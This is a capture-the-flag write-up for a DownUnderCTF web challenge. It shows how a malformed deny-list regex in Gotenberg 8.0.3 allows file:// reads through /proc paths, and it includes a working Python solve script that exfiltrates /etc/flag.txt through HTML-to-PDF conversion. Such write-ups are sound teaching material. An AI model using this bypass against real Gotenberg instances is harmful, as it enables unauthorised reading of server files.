---
ai_date: 2025-04-27 05:15:36
ai_summary: Exploited misconfigured regex to access /etc/flag.txt via `/proc` path traversal in Chromium Docker image
ai_tags:
  - lfi
  - proc-tmp
  - path-traversal
created: 2024-07-05T20:39
description: smh bad regex
points: 129
solves: 173
title: hah_got_em
updated: 2025-07-14T09:46
---

## Analysis
The docker image is fixed at `gotenbergv8.0.3`, I wonder why...
![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1720298973/2024/07/ec4bad9f49946fcd2204722dbbd5564c.png)

Turns out there's a security update right after.

After looking through the patch, I found the following lines that were removed.

```go
CHROMIUM_DENY_LIST="^file:///[^tmp].*"

if !b.arguments.allowList.MatchString(url) {
    return fmt.Errorf("'%s' does not match the expression from the allowed list: %w", url, ErrUrlNotAuthorized)
}

if b.arguments.denyList.String() != "" && b.arguments.denyList.MatchString(url) {
    return fmt.Errorf("'%s' matches the expression from the denied list: %w", url, ErrUrlNotAuthorized)
}
```

It appears that the regex was misconfigured and would allow any path that starts with either `t` `m` or `p`.
## Attack
To access `/etc/flag.txt` with a url starting with any character in `[tmp]`, the first thing that came to mind was `proc`.

So I used the docker shell and looked for flag.txt.

```sh
ls proc/*/*/*/* | grep flag.txt
```

```txt
...
proc/26/cwd/etc/flag.txt
proc/26/cwd/tmp/flag.txt
proc/26/root/etc/flag.txt
proc/26/root/tmp/flag.txt
proc/66/root/etc/flag.txt
proc/66/root/tmp/flag.txt
proc/7/root/etc/flag.txt
proc/7/root/tmp/flag.txt
proc/70/root/etc/flag.txt
proc/70/root/tmp/flag.txt
proc/71/root/etc/flag.txt
...
```

Wow, there's a lot of them, so I picked `pid=7` because I liked the number.

## Solve Script

```python
import requests
import io
import fitz
file_content = """
<iframe src="file:///proc/7/root/etc/flag.txt"></iframe>
"""
file_path = "index.html"

payload = io.BytesIO(file_content.encode('utf-8'))

url = "https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/forms/chromium/convert/markdown"

files = {"html": (file_path, payload), "md": ("dummy.md", payload)}
response = requests.post(url, files=files)
if 'application/pdf' not in response.headers['Content-Type']:
    print(response.text)
    exit()
print(response.status_code)
pdf_bytes = io.BytesIO(response.content)
pdf_document = fitz.open(stream=pdf_bytes, filetype="pdf")
all_text = ""
for page_num in range(len(pdf_document)):
    page = pdf_document.load_page(page_num)
    all_text += page.get_text()
print(all_text)
```